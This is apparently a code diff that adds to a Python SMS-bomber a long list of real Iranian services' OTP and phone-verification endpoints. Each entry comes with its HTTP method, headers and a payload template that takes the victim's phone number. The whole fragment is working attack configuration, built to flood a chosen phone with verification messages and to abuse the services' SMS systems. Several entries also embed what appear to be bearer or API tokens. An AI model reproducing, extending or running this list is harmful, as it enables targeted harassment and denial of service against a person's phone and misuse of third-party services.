+    {"name": "Zigap", "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "+98{phone}"}, "type": "json"},
+    {"name": "Tap33", "url": "https://tap33.me/api/v2/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"credential": {"phoneNumber": "0{phone}", "role": "BIKER"}}, "type": "json"},
+    {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Sheypoor", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Alibaba", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
+    {"name": "Digikala", "url": "https://api.digikala.com/v1/user/authenticate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}", "otp_call": False}, "type": "json"},
+    {"name": "Digikala V2", "url": "https://api.digikala.com/v1/user/forgot/check/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "DigikalaJet", "url": "https://api.digikalajet.ir/user/login-register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Digikalacall", "url": "https://api.digikala.com/v1/user/authenticate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"backUrl": "/", "username": "0{phone}", "otp_call": "true"}, "type": "json"},
+    {"name": "Jabama", "url": "https://gw.jabama.com/api/v4/account/send-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Rojashop", "url": "https://rojashop.com/api/auth/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Bikoplus", "url": "https://bikoplus.com/account/check-phone-number", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
+    {"name": "Torob", "url": "https://api.torob.com/a/phone/send-pin/", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
+    {"name": "Banimode", "url": "https://mobapi.banimode.com/api/v2/auth/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Basalam", "url": "https://auth.basalam.com/otp-request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Pinket", "url": "https://pinket.com/api/cu/v2/phone-verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
+    {"name": "Khanoumi", "url": "https://www.khanoumi.com/accounts/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "redirectUrl": ""}, "type": "json"},
+    {"name": "Digistyle", "url": "https://www.digistyle.com/users/login-register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"loginRegister[email_phone]": "0{phone}"}, "type": "json"},
+    {"name": "Microele", "url": "https://www.microele.com/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}", "action": "register", "ajax": "1"}, "type": "json"},
+    {"name": "Electrastore", "url": "https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"telephone": "0{phone}"}, "type": "json"},
+    {"name": "Primashop", "url": "https://primashop.ir/index.php?route=extension/module/websky_otp/send_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"telephone": "0{phone}"}, "type": "json"},
+    {"name": "Ubike", "url": "https://ubike.ir/index.php?route=extension/module/websky_otp/send_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"telephone": "0{phone}"}, "type": "json"},
+    {"name": "Titomarket", "url": "https://titomarket.com/index.php?route=account/login_verify/verify", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"redirect": "https://titomarket.com/my-account", "telephone": "0{phone}"}, "type": "json"},
+    {"name": "4hair", "url": "https://4hair.ir/user/login.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"num": "0{phone}", "ok": ""}, "type": "json"},
+    {"name": "Igame", "url": "https://igame.ir/api/play/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Karlancer", "url": "https://www.karlancer.com/api/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "{phone}", "role": "freelancer"}, "type": "json"},
+    {"name": "Hsaria", "url": "https://www.hsaria.com/MemberRegisterLogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "{phone}"}, "type": "json"},
+    {"name": "Twsms", "url": "https://twsms.ir/client/register.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "agree": "agree", "sendsms": "1"}, "type": "json"},
+    {"name": "Baradarantoy", "url": "https://baradarantoy.ir/send_confirm_sms_ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"user_tel": "0{phone}"}, "type": "json"},
+    {"name": "Kavirmotor", "url": "https://kavirmotor.com/sms/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
+    {"name": "Chechilas", "url": "https://chechilas.com/user/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mob": "0{phone}"}, "type": "json"},
+    {"name": "Searchii", "url": "https://searchii.ir/controler/phone_otp.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_number": "0{phone}", "action": "send_otp", "login": "user"}, "type": "json"},
+    {"name": "Badparak", "url": "https://badparak.com/register/request_verification_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Hermeskala", "url": "https://hermeskala.com/login/send_vcode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_number": "0{phone}"}, "type": "json"},
+    {"name": "Elinorboutique", "url": "https://api.elinorboutique.com/v1/customer/register-login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Atlasmode", "url": "https://api.atlasmode.ir/v1/customer/register-login?version=new2", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Pooshakshoniz", "url": "https://api.pooshakshoniz.com/v1/customer/register-login?version=new1", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Benedito", "url": "https://api.benedito.ir/v1/customer/register-login?version=new1", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Rubeston", "url": "https://www.rubeston.com/api/customers/login-register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "step": "1"}, "type": "json"},
+    {"name": "Payagym", "url": "https://payagym.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "action": "kerasno_proform_register_inline_send"}, "type": "json"},
+    {"name": "Martday", "url": "https://martday.ir/api/customer/member/register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"email": "0{phone}", "accept_term": "on"}, "type": "json"},
+    {"name": "Paaakar", "url": "https://api.paaakar.com/v1/customer/register-login?version=new1", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Atrinelec", "url": "https://www.atrinelec.com/ajax/SendSmsVerfiyCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Ketabweb", "url": "https://ketabweb.com/login/?usernameCheck=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Hiss", "url": "https://hiss.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_email": "0{phone}", "action": "bakala_send_code"}, "type": "json"},
+    {"name": "Tahrir-online", "url": "https://tahrir-online.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "+98{phone}", "form": "register", "action": "mobix_send_otp_code"}, "type": "json"},
+    {"name": "Shikstyle", "url": "https://shik.style/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "login", "form=phone": "{phone}"}, "type": "json"},
+    {"name": "Maxbax", "url": "https://maxbax.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "bakala_send_code", "phone_email": "0{phone}"}, "type": "json"},
+    {"name": "Zzzagros", "url": "https://www.zzzagros.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "ywp_ajax_register", "ywp_register": "1", "ywp_reg_mobile": "0{phone}"}, "type": "json"},
+    {"name": "Khodro45", "url": "https://khodro45.com/api/v1/customers/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Bama", "url": "https://bama.ir/signin-checkforcellnumber", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"cellNumber": "0{phone}"}, "type": "form"},
+    {"name": "Balad", "url": "https://account.api.balad.ir/api/web/auth/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}", "os_type": "W"}, "type": "json"},
+    {"name": "Hamrah-Mechanic", "url": "https://www.hamrah-mechanic.com/api/v1/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}", "referrer": "https://www.google.com/"}, "type": "json"},
+    {"name": "Hamrahsport", "url": "https://hamrahsport.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cell": "{phone}", "agree": "1", "send_otp": "1"}, "type": "json"},
+    {"name": "Mrbilit", "url": "https://auth.mrbilit.com/api/login/exists/v2", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"mobileOrEmail": "0{phone}", "source": "2", "sendTokenIfNot": "true"}, "type": "json"},
+    {"name": "Dastaneman", "url": "https://dastaneman.com/User/SendCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0098{phone}"}, "type": "json"},
+    {"name": "Nikanbike", "url": "https://nikanbike.com/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"controller": "authentication", "fc": "module", "ajax": "true", "module": "iverify", "phone_mobile": "0{phone}", "SubmitCheck": ""}, "type": "json"},
+    {"name": "Lendo", "url": "https://api.lendo.ir/api/customer/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Nobat", "url": "https://nobat.ir/api/public/patient/login/phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "{phone}"}, "type": "json"},
+    {"name": "DrSaina", "url": "https://www.drsaina.com/RegisterLogin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"PhoneNumber": "0{phone}", "action": "checkIfUserExistOrNot", "noLayout": "False"}, "type": "form"},
+    {"name": "Drnext", "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"source": "besina", "mobile": "0{phone}"}, "type": "json"},
+    {"name": "Doctoreto", "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "country_id": 205}, "type": "json"},
+    {"name": "Drdr", "url": "https://drdr.ir/api/v3/auth/login/mobile/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Pezeshket", "url": "https://api.pezeshket.com/core/v1/auth/requestCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileNumber": "0{phone}"}, "type": "json"},
+    {"name": "Mihanpezeshk", "url": "https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"mobile": "0{phone}", "recaptcha": ""}, "type": "form"},
+    {"name": "Limome", "url": "https://my.limoome.com/api/auth/login/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobileNumber": "{phone}", "country": "1"}, "type": "form"},
+    {"name": "Bimito", "url": "https://bimito.com/api/core/app/user/checkLoginAvailability/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
+    {"name": "Azki", "url": "https://www.azki.com/api/core/v2/app/auth/register-verify-code", "method": "POST", "headers": {"Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Accept-Language": "fa", "Origin": "https://www.azki.com", "Referer": "https://www.azki.com/", "device": "androidWeb", "deviceid": "7", "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36"}, "payload": {"phoneNumber": "{phone}", "origin": "www.azki.com"}, "type": "json"},
+    {"name": "Drto", "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "country_id": 205}, "type": "json"},
+    {"name": "OKCS", "url": "https://okcs.com/users/mobilelogin", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "IToll", "url": "https://app.itoll.com/api/v1/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "{phone}"}, "type": "json"},
+    {"name": "Bimebazar", "url": "https://bimebazar.com/accounts/api/login_sec/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Bitbarg", "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Bitpin", "url": "https://api.bitpin.ir/v1/usr/sub_phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}", "captcha_token": ""}, "type": "json"},
+    {"name": "Bit24", "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "contry_code": "98"}, "type": "json"},
+    {"name": "Okala", "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}, "type": "json"},
+    {"name": "Paymishe", "url": "https://api.paymishe.com/api/v1/otp/registerOrLogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Pooleno", "url": "https://api.pooleno.ir/v1/auth/check-mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Raybit", "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Anargift", "url": "https://api.anargift.com/api/people/auth", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"user": "0{phone}"}, "type": "json"},
+    {"name": "Okorosh", "url": "https://my.okcs.com/api/check-mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "g-recaptcha-response": ""}, "type": "json"},
+    {"name": "Simkhan", "url": "https://www.simkhanapi.ir/api/users/registerV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileNumber": "0{phone}", "ReSendSMS": False}, "type": "json"},
+    {"name": "Beroozmarket", "url": "https://api.beroozmart.com/api/pub/account/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "sendViaSms": True, "email": "null", "sendViaEmail": False}, "type": "json"},
+    {"name": "Ickala", "url": "https://ickala.com/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"controller": "SendSMS", "module": "loginbymobile", "SubmitSmsSend": "1", "ajax": "true", "otp_mobile_num": "0{phone}"}, "type": "json"},
+    {"name": "GapFilm", "url": "https://core.gapfilm.ir/api/v3.1/Account/Login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Type": "3", "Username": "0{phone}"}, "type": "json"},
+    {"name": "Gap", "url": "https://core.gap.im/v1/user/add.json", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"mobile": "%2B98{phone}"}, "type": "json"},
+    {"name": "Rubika", "url": "https://messengerg2c4.iranlms.ir/", "method": "POST", "headers": {"Content-Type": "text/plain"}, "payload": {"api_version": "3", "method": "sendCode", "data": {"phone_number": "{phone}", "send_type": "SMS"}}, "type": "json"},
+    {"name": "Bale", "url": "https://app.bale.ai/api/v1/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Shad", "url": "https://shadmessenger12.iranlms.ir/", "method": "POST", "headers": {"Content-Type": "text/plain"}, "payload": {"api_version": "3", "method": "sendCode", "data": {"phone_number": "098{phone}", "send_type": "SMS"}}, "type": "json"},
+    {"name": "SibApp", "url": "https://api.sibapp.ir/api/v1/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
+    {"name": "Telewebion", "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"code": "98", "phone": "{phone}", "smsStatus": "default"}, "type": "json"},
+    {"name": "Dalfak", "url": "https://www.dalfak.com/api/auth/sendVerificationCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"type": 1, "value": "0{phone}"}, "type": "json"},
+    {"name": "Filmnet", "url": "https://api-v2.filmnet.ir/access-token/users/{phone}/otp", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {}, "type": "json"},
+    {"name": "Namava", "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"UserName": "0{phone}"}, "type": "json"},
+    {"name": "Chamedoon", "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "origin": "/", "referrer_id": None}, "type": "json"},
+    {"name": "Olgoo", "url": "https://www.olgoobooks.ir/sn/userRegistration/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"contactInfo[mobile]": "0{phone}", "contactInfo[agreementAccepted]": "1", "submit_register": "1"}, "type": "form"},
+    {"name": "Pakhsh", "url": "https://www.pakhsh.shop/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "0{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
+    {"name": "Didnegar", "url": "https://www.didnegar.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "{phone}", "login": "1", "json": "1", "whatsapp": "0"}, "type": "form"},
+    {"name": "Baskol", "url": "https://www.buskool.com/send_verification_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Kilid", "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "See5", "url": "https://crm.see5.net/api_ajax/sendotp.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobile": "0{phone}", "action": "sendsms"}, "type": "form"},
+    {"name": "Ghabzino", "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", "method": "GET", "headers": {"Content-Type": "application/json"}, "payload": {"Parameters": {"ApplicationType": "Web", "ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0", "MobileNumber": "0{phone}"}}, "type": "json"},
+    {"name": "Seebirani", "url": "https://sandbox.sibirani.ir/api/v1/user/invite", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Binjo", "url": "https://api.binjo.ir/api/panel/get_code/{phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {}, "type": "json"},
+    {"name": "Amoomilad", "url": "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Token": "5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c", "DeviceId": 1, "PhoneNumber": "0{phone}", "Helper": 77942}, "type": "json"},
+    {"name": "Devsloop", "url": "https://i.devslop.app/app/ifollow/api/otp.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"number": "0{phone}", "state": "number"}, "type": "form"},
+    {"name": "Hiword", "url": "https://hiword.ir/wp-json/otp-login/v1/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"identifier": "0{phone}"}, "type": "json"},
+    {"name": "Tnovin", "url": "http://shop.tnovin.com/login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phone": "0{phone}"}, "type": "form"},
+    {"name": "Exo", "url": "https://exo.ir/index.php?route=account/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_number": "0{phone}"}, "type": "json"},
+    {"name": "Shahrefarsh", "url": "https://shahrfarsh.com/Account/Login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phoneNumber": "0{phone}"}, "type": "form"},
+    {"name": "Tikban", "url": "https://tikban.com/Account/LoginAndRegister", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellPhone": "0{phone}"}, "type": "json"},
+    {"name": "Dicardo", "url": "https://dicardo.com/main/sendsms", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Farsgraphic", "url": "https://farsgraphic.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
+    {"name": "Steelalborz", "url": "https://steelalborz.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "0{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
+    {"name": "Offdecor", "url": "https://www.offdecor.com/index.php?route=account/login/sendCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Tagmond", "url": "https://tagmond.com/phone_number", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"utf8": "✓", "phone_number": "0{phone}", "g-recaptcha-response": ""}, "type": "form"},
+    {"name": "Zoodex", "url": "https://admin.zoodex.ir/api/v1/login/check", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Ayantech", "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Parametrs": {"ApplicationType": "Web", "ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0", "MobileNumber": "0{phone}"}}, "type": "json"},
+    {"name": "Dadhesab", "url": "https://api.dadhesab.ir/user/entry", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Homtick", "url": "https://auth.homtick.com/api/V1/User/GetVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileOrEmail": "0{phone}", "deviceCode": "d520c7a8-421b-4563-b955-f5abc56b97ec", "firstName": "", "lastName": "", "password": ""}, "type": "json"},
+    {"name": "Iranamlaak", "url": "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"AgencyMobile": "0{phone}"}, "type": "json"},
+    {"name": "Karchidari", "url": "https://api.kcd.app/api/v1/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Rayshomar", "url": "https://api.rayshomar.ir/api/Register/RegistrMobile", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"MobileNumber": "0{phone}"}, "type": "form"},
+    {"name": "Uphone", "url": "https://server.uphone.ir/api/v1/login/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Novinbook", "url": "https://novinbook.com/index.php?route=account/phone", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phone": "0{phone}"}, "type": "form"},
+    {"name": "Offch", "url": "https://api.offch.com/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
+    {"name": "Glite", "url": "https://www.glite.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "logini_first", "login": "0{phone}"}, "type": "form"},
+    {"name": "Sabziman", "url": "https://sabziman.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "newphoneexist", "phonenumber": "0{phone}"}, "type": "form"},
+    {"name": "Tajtehran", "url": "https://tajtehran.com/RegisterRequest", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobile": "0{phone}", "password": "mamad1234"}, "type": "form"},
+    {"name": "Watchonline", "url": "https://api.watchonline.shop/api/v1/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "Authorization": "Bearer 7e3b55d76312e3c127758e1a5d47d27d49ea22ebf7d9ba99cb9ff3516d34900b"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
+    {"name": "Gharar", "url": "https://gharar.ir/users/phone_number/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phone": "0{phone}"}, "type": "form"},
+    {"name": "Janebi", "url": "https://janebi.com/signin?do", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"resend": "0{phone}"}, "type": "json"},
+    {"name": "Komodaa", "url": "https://api.komodaa.com/api/v2.6/loginRC/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
+    {"name": "Noavarpub", "url": "https://noavarpub.com/logins/login.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}", "submit": "123"}, "type": "json"},
+    {"name": "Cheshmandazketab", "url": "https://www.cheshmandazketab.ir/Register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}", "login": "1"}, "type": "json"},
+    {"name": "Nalinoco", "url": "https://www.nalinoco.com/api/customers/login-register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "ReturnUrl": "/", "step": "1"}, "type": "json"},
+    {"name": "Harikashop", "url": "https://harikashop.com/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}", "action": "register", "ajax": "1"}, "type": "json"},
